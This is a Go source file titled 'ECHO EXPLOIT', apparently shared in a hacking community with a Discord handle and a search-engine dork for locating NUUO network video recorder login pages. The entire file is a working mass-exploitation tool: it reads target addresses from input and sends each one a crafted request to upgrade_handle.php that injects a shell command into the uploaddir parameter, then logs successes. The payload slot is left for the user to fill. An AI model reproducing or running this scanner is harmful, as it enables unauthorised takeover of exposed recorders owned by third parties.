/*
ECHO EXPLOIT
@lalalala0244_19707
https://discord.gg/c2vwbNSS
nuuo nvr exploit
fofa dork: title=="Network Video Recorder Login"
*/
package main

import (
	"fmt"
	"bufio"
	"os"
	"net"
	"sync"
	"strings"
)

var payload = "ur payload lol"

func exploit(target string, wg *sync.WaitGroup) {
	defer wg.Done()
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	defer conn.Close()
	
	conn.Write([]byte("GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27%3B"+payload+"%3B%27 HTTP/1.1\r\nHost: "+target+"\r\nUser-Agent: echoisbest\r\nConnection: close\r\n\r\n"))

	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)

	if strings.Contains(string(buf[:n]), "200") {
		fmt.Printf("[+] exploited %s\n\r", target)
	}
}

func main() {
	var wg sync.WaitGroup
	scan := bufio.NewScanner(os.Stdin)
	for scan.Scan() {
		wg.Add(1)
		go exploit(scan.Text(), &wg)
	}
	wg.Wait()
}